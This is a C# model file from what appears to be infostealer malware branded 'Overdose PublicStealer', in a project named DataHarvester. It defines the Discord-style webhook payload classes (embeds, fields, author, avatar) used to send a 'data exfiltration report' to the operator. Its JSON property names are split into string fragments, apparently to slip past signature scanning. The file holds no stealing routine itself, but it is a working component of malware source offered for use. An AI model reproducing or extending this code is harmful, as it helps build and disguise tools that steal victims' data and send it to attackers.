using System;
using System.Collections.Generic;
using System.Text.Json.Serialization;
using System.Text;

namespace DataHarvester.Models
{
    internal static class JsonPropertyNames
    {
        internal const string NP1 = "nam", NP2 = "e";
        internal const string VP1 = "valu", VP2 = "e";
        internal const string IP1 = "inlin", IP2 = "e";
        internal const string TP1 = "tex", TP2 = "t";
        internal const string IUP1 = "icon_ur", IUP2 = "l";
        internal const string UP1 = "ur", UP2 = "l";
        internal const string TiP1 = "titl", TiP2 = "e";
        internal const string DP1 = "descriptio", DP2 = "n";
        internal const string CP1 = "colo", CP2 = "r";
        internal const string FiP1 = "fiel", FiP2 = "ds";
        internal const string ImP1 = "imag", ImP2 = "e";
        internal const string FoP1 = "foote", FoP2 = "r";
        internal const string TsP1 = "timestam", TsP2 = "p";
        internal const string AuP1 = "autho", AuP2 = "r";
        internal const string ThP1 = "thumbnai", ThP2 = "l";
        internal const string UNP1 = "usernam", UNP2 = "e";
        internal const string AUP1 = "avatar_ur", AUP2 = "l";
        internal const string EP1 = "embed", EP2 = "s";
        internal const string CoP1 = "conten", CoP2 = "t";
        internal const string TtP1 = "tt", TtP2 = "s";
    }

    internal class EmbedField
    {
        [JsonPropertyName(JsonPropertyNames.NP1 + JsonPropertyNames.NP2)] public string Name { get; set; }
        [JsonPropertyName(JsonPropertyNames.VP1 + JsonPropertyNames.VP2)] public string Value { get; set; }
        [JsonPropertyName(JsonPropertyNames.IP1 + JsonPropertyNames.IP2)] public bool Inline { get; set; }
    }

    internal class EmbedFooter
    {
        [JsonPropertyName(JsonPropertyNames.TP1 + JsonPropertyNames.TP2)] public string Text { get; set; }
        [JsonPropertyName(JsonPropertyNames.IUP1 + JsonPropertyNames.IUP2)] public string IconUrl { get; set; }
    }

    internal class EmbedImage
    {
        [JsonPropertyName(JsonPropertyNames.UP1 + JsonPropertyNames.UP2)] public string Url { get; set; }
    }

    internal class EmbedAuthor
    {
        [JsonPropertyName(JsonPropertyNames.NP1 + JsonPropertyNames.NP2)] public string Name { get; set; }
        [JsonPropertyName(JsonPropertyNames.UP1 + JsonPropertyNames.UP2)] public string Url { get; set; }
        [JsonPropertyName(JsonPropertyNames.IUP1 + JsonPropertyNames.IUP2)] public string IconUrl { get; set; }
    }

    internal class EmbedThumbnail
    {
        [JsonPropertyName(JsonPropertyNames.UP1 + JsonPropertyNames.UP2)] public string Url { get; set; }
    }

    internal class Embed
    {
        private string _t;
        [JsonPropertyName(JsonPropertyNames.TiP1 + JsonPropertyNames.TiP2)]
        public string Title { get { return _t ?? BuildTitle(); } set { _t = value; } }

        private string BuildTitle()
        {
            var sb = new StringBuilder();
            sb.Append("💊 ");
            sb.Append("New Overdose PublicStealer Report ");
            sb.Append("💊");
            return sb.ToString();
        }

        private string _d;
        [JsonPropertyName(JsonPropertyNames.DP1 + JsonPropertyNames.DP2)]
        public string Description { get { return _d ?? BuildDescription(); } set { _d = value; } }

        private string BuildDescription()
        {
            var sb = new StringBuilder();
            sb.Append("A new data exfiltration report has been generated.");
            return sb.ToString();
        }

        [JsonPropertyName(JsonPropertyNames.CP1 + JsonPropertyNames.CP2)] public int Color { get; set; }
        [JsonPropertyName(JsonPropertyNames.FiP1 + JsonPropertyNames.FiP2)] public List<EmbedField> Fields { get; set; } = new List<EmbedField>();
        [JsonPropertyName(JsonPropertyNames.ImP1 + JsonPropertyNames.ImP2)] public EmbedImage Image { get; set; }
        [JsonPropertyName(JsonPropertyNames.FoP1 + JsonPropertyNames.FoP2)] public EmbedFooter Footer { get; set; }
        [JsonPropertyName(JsonPropertyNames.TsP1 + JsonPropertyNames.TsP2)] public DateTimeOffset Timestamp { get; set; }
        [JsonPropertyName(JsonPropertyNames.AuP1 + JsonPropertyNames.AuP2)] public EmbedAuthor Author { get; set; }
        [JsonPropertyName(JsonPropertyNames.ThP1 + JsonPropertyNames.ThP2)] public EmbedThumbnail Thumbnail { get; set; }
    }

    internal class WebhookPayload
    {
        private string _u;
        [JsonPropertyName(JsonPropertyNames.UNP1 + JsonPropertyNames.UNP2)]
        public string Username { get { return _u ?? BuildUsername(); } set { _u = value; } }

        private string BuildUsername()
        {
            var sb = new StringBuilder();
            sb.Append("Overdose PublicStealer");
            return sb.ToString();
        }

        public static string DefaultAvatarUrl { get { return BuildDefaultAvatarUrl(); } }
        private static string BuildDefaultAvatarUrl()
        {
            return "https://i.pinimg.com/736x/56/a5/3c/56a53c0a581d8036e41f6de0656a869e.jpg";
        }

        public static string DefaultEmbedImageUrl { get { return BuildDefaultEmbedImageUrl(); } }
        private static string BuildDefaultEmbedImageUrl()
        {
            return "https://i.pinimg.com/736x/11/f6/2c/11f62cf257786c26fcf190441808db12.jpg";
        }

        [JsonPropertyName(JsonPropertyNames.AUP1 + JsonPropertyNames.AUP2)] public string AvatarUrl { get; set; } = DefaultAvatarUrl;
        [JsonPropertyName(JsonPropertyNames.EP1 + JsonPropertyNames.EP2)] public List<Embed> Embeds { get; set; } = new List<Embed>();
        [JsonPropertyName(JsonPropertyNames.CoP1 + JsonPropertyNames.CoP2)] public string Content { get; set; }
        [JsonPropertyName(JsonPropertyNames.TtP1 + JsonPropertyNames.TtP2)] public bool Tts { get; set; }
    }
}
